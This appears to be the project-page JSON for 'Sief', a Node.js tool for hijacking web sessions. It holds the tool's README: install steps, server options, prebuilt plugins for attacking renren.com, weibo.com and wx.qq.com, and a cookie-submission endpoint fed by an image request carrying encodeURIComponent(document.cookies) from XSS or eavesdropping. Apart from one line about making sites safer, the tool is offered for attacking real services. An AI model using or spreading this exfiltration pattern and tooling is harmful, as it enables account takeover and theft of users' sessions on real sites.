{"name":"Sief","tagline":"Session hijacking tool in Node.","body":"Sief is a server listening to cookie submissions to hijack sessions, supporting writing plugins for site specific attacks.\r\n\r\n    sief = thief + safe\r\n\r\nThis is a project to hijack sessions, and also a project to make your site safer, depending on the way you use it.\r\n\r\n## Philosophy\r\n\r\n* Do **NOT** steal cookies, only accept cookies from everywhere(xss, network eavsdropping, dns hijackingâ€¦)\r\n* Focus on the exploitation of session hijacking.\r\n\r\n## Features\r\n\r\n* Request to an image to upload cookies stolen by xss/network eavsdropping/dns hijack/other.\r\n* Log persistence.\r\n* Prebuilt plugins to attack renren.com, weibo.com, wx.qq.com.\r\n* Write your own plugins to do other attacks you desired. Plugins are loaded/reloaded/unloaded when added/changed/removed automatically, no need to restart.\r\n* View real-time cookie submissions and login to those hijacked sessions directly in browser with [Sief Chrome Extension](https://github.com/shaoshuai0102/sief-chrome-extension).\r\n* Ignore cookie submissions if the same one is received before, during a specified period of time, to protect your server.\r\n\r\n## Install\r\n\r\n1. Install PhantomJS\r\n\r\n2. Install sief\r\n\r\n   `npm install sief -g`\r\n\r\n## Usage\r\n\r\n### Server\r\n\r\n    Usage: sief [options] <plugin|dir ...>\r\n\r\n    Options:\r\n\r\n      -h, --help                   output usage information\r\n      -V, --version                output the version number\r\n      -i, --ignore-time [seconds]  specify seconds during which same requests will be ignored [300]\r\n      -p, --port [port]            specify the port sief server listening to [3000]\r\n      -l, --log-level [level]      set log level [INFO]\r\n\r\n\r\n### Submit cookies\r\n\r\n    GET /xxx.png?cookie=#cookies#&referer=#referer#&domain=#domani#\r\n\r\nParameters:\r\n\r\n* `cookies` - Required. Encode cookies first, for example, `encodeURIComponent(document.cookies)`\r\n* `referer` - If the attack is an xss exploit, referer will be retrieved from `headers.referer` directly, otherwise, specifiy it in query string.\r\n* `domain` - Domain is calculated from referer, defaults to main domain, for example `qq.com`. IF you want to fire a attack to its subdomain(`wx.qq.com`), specify it in query string.\r\n","google":"","note":"Don't delete this file! It's used internally to help with page regeneration."}